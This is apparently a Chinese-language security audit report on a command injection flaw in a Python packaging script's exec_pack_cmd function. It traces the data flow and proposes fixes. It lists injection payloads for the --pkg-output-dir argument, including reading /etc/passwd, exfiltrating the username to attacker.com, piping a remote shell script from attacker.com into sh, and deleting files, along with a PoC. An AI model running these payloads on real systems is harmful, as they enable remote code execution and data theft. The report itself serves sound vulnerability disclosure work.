# VULN-008：packer.py命令注入漏洞

## 漏洞概述

| 属性 | 值 |
|------|-----|
| **ID** | VULN-008 |
| **类型** | Command Injection |
| **CWE** | CWE-78 (OS Command Injection) |
| **严重性** | Critical |
| **置信度** | 95% |
| **文件** | `scripts/package/common/py/packer.py` |
| **行号** | 206-220 |
| **函数** | `exec_pack_cmd` |
| **状态** | 已确认 - 真实漏洞 |

## 漏洞代码

```python
def exec_pack_cmd(delivery_dir: str,
                 pack_cmd: str,
                 package_name: str) -> str: 
    """执行打包命令"""
    if delivery_dir:
        cmd = f'cd {delivery_dir} && {pack_cmd}'  # 漏洞点: f-string拼接
    else:
        cmd = pack_cmd
    CommLog.cilog_info("package cmd:%s", cmd)
    result = subprocess.run(cmd, shell=True, check=False, stdout=PIPE, stderr=STDOUT)  # 漏洞点: shell=True
    output = result.stdout.decode()
    if result.returncode != 0:
        CommLog.cilog_error(__file__, "compress package(%s) failed! %s.", package_name, output)
        raise CompressError(package_name)
    return package_name
```

## 完整数据流分析

### 1. 主要攻击向量：delivery_dir

```
CLI参数 --pkg-output-dir
         │
         ▼
    args.pkg_output_dir  (package.py:808)
         │
         ▼
    get_compress_cmd(delivery_dir=pkg_output_dir, ...)  (package.py:437)
         │
         ▼
    exec_pack_cmd(delivery_dir, pack_cmd, ...)  (package.py:72)
         │
         ▼
    cmd = f'cd {delivery_dir} && {pack_cmd}'  (packer.py:211)
         │
         ▼
    subprocess.run(cmd, shell=True, ...)  (packer.py:215)
```

### 2. 次要攻击向量：pack_cmd组件

`pack_cmd` 通过 `compose_makeself_command()` 构造，包含：
- `source_target` = `pkg_args.pkg_output_dir` (同样可被攻击者控制)
- `cleanup` 来自XML配置 (`package_attr.get('cleanup')`)
- `install_script` 来自XML配置
- `help_info` 来自XML配置

## 攻击向量

### 向量1：直接命令行注入

**攻击命令:**
```bash
python scripts/package/package.py \
    --pkg-output-dir "; id; cat /etc/passwd; echo '" \
    --pkg-name <valid_pkg> \
    --independent_pkg
```

**生成的Shell命令:**
```bash
cd ; id; cat /etc/passwd; echo ' && <pack_cmd>
```

**效果:** 执行 `id`, `cat /etc/passwd`, 然后 `echo` 命令。

### 向量2：反引号命令替换

**攻击命令:**
```bash
python scripts/package/package.py \
    --pkg-output-dir "`whoami`" \
    --pkg-name <valid_pkg>
```

**生成的Shell命令:**
```bash
cd `whoami` && <pack_cmd>
```

### 向量3：变量扩展

**攻击命令:**
```bash
python scripts/package/package.py \
    --pkg-output-dir '$(curl http://attacker.com/$(whoami))' \
    --pkg-name <valid_pkg>
```

**效果:** 将用户名泄露到攻击者控制的服务器。

### 向量4：换行符注入

**攻击命令:**
```bash
python scripts/package/package.py \
    --pkg-output-dir $'/tmp\nrm -rf /tmp/*\n#' \
    --pkg-name <valid_pkg>
```

## 利用场景

### 场景1：CI/CD流水线入侵

如果此脚本用于CI/CD流水线，构建参数可被影响：
1. 攻击者获取构建配置或环境访问权限
2. 修改构建脚本中的 `--pkg-output-dir` 参数
3. 打包阶段执行任意命令
4. 可能对下游消费者进行供应链攻击

### 场景2：开发者机器入侵

如果攻击者能诱骗开发者运行：
```bash
# 来自不可信源的恶意"构建脚本"
python scripts/package/package.py --pkg-output-dir "$(curl attacker.com/shell.sh|sh)" ...
```

### 场景3：权限提升

如果脚本以提升权限运行（如Docker中用root，或通过sudo）：
- 完全系统入侵
- 数据泄露
- 持久化后门安装

## 攻击复杂度评估

| 因素 | 评级 | 原因 |
|------|------|------|
| **攻击向量** | Local/Adjacent | 需要能以构造参数调用脚本 |
| **攻击复杂度** | Low | 无特殊条件要求 |
| **所需权限** | Low | 需要调用构建脚本 |
| **用户交互** | None | 参数被控制后无需交互 |
| **范围** | Unchanged | 仅影响运行脚本的系统 |
| **影响** | High | 以脚本权限完全命令执行 |

## 可利用性：中高

### 降低可利用性的因素
1. 脚本是构建工具，不是面向互联网的服务
2. 需要能控制命令行参数
3. 攻击者通常已有类似访问级别

### 增加可利用性的因素
1. 在CI/CD流水线中常见，参数可被注入
2. `shell=True` 配合 f-string 是经典注入模式
3. 完全无输入清洗
4. 用于软件供应链（CANN是华为AI框架）

## 概念验证

```python
#!/usr/bin/env python3
# VULN-008命令注入PoC
# 演示exec_pack_cmd()中的漏洞

import subprocess

# 模拟漏洞函数
def exec_pack_cmd_vulnerable(delivery_dir: str, pack_cmd: str) -> None:
    """packer.py中的漏洞函数"""
    if delivery_dir:
        cmd = f'cd {delivery_dir} && {pack_cmd}'
    else:
        cmd = pack_cmd
    print(f"[VULNERABLE] 执行: {cmd}")
    # subprocess.run(cmd, shell=True, check=False)  # 实际漏洞调用

# 演示注入的测试用例
test_cases = [
    ("; id", "echo 'test'"),
    ("$(whoami)", "echo 'test'"),
    ("`cat /etc/passwd`", "echo 'test'"),
    ("/tmp; curl http://attacker.com/exfil", "echo 'test'"),
]

print("=== 命令注入PoC ===\n")
for delivery_dir, pack_cmd in test_cases:
    exec_pack_cmd_vulnerable(delivery_dir, pack_cmd)
    print()

print("所有payload将在shell=True下执行")
```

## 推荐缓解措施

### 方案1：移除shell=True（推荐）

```python
def exec_pack_cmd(delivery_dir: str,
                 pack_cmd: str,
                 package_name: str) -> str:
    """执行打包命令"""
    if delivery_dir:
        # 使用subprocess不带shell=True
        # 用cwd参数切换目录而非cd命令
        result = subprocess.run(
            pack_cmd.split(),  # 将命令分割为列表
            cwd=delivery_dir,  # 用cwd参数代替cd
            check=False,
            stdout=PIPE,
            stderr=STDOUT
        )
    else:
        result = subprocess.run(
            pack_cmd.split(),
            check=False,
            stdout=PIPE,
            stderr=STDOUT
        )
    # ... 函数其余部分
```

### 方案2：使用shlex.quote()清洗

```python
import shlex

def exec_pack_cmd(delivery_dir: str,
                 pack_cmd: str,
                 package_name: str) -> str:
    """执行打包命令"""
    if delivery_dir:
        # 清洗delivery_dir
        safe_dir = shlex.quote(delivery_dir)
        cmd = f'cd {safe_dir} && {pack_cmd}'
    else:
        cmd = pack_cmd
    # 仍建议移除shell=True
```

### 方案3：验证路径输入

```python
import os

def exec_pack_cmd(delivery_dir: str,
                 pack_cmd: str,
                 package_name: str) -> str:
    """执行打包命令"""
    if delivery_dir:
        # 验证delivery_dir是真实、安全的目录
        delivery_dir = os.path.realpath(delivery_dir)
        if not os.path.isdir(delivery_dir):
            raise ValueError(f"Invalid delivery_dir: {delivery_dir}")
        # 额外验证: 确保路径不含shell元字符
        if any(c in delivery_dir for c in ';$`|&<>(){}[]'):
            raise ValueError(f"Invalid characters in delivery_dir")
    # ... 函数其余部分
```

## 参考文献

- **CWE-78**: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')
- **OWASP**: Command Injection - https://owasp.org/www-community/attacks/Command_Injection
- **Python安全**: subprocess.run() with shell=True - https://docs.python.org/3/library/subprocess.html#security-considerations

## 结论

**判定: 已确认 - 真实漏洞**

这是一个已确认的命令注入漏洞。虽然攻击需要控制命令行参数（降低了攻击面），但完全没有输入清洗配合 `shell=True` 创造了真实安全风险，特别是在：

1. CI/CD环境中构建参数可能动态生成
2. 链接多个工具的构建脚本
3. 攻击者能影响脚本参数的任何场景

漏洞应通过移除 `shell=True` 并使用 `subprocess.run()` 传递参数列表和 `cwd=` 参数来切换目录来修复。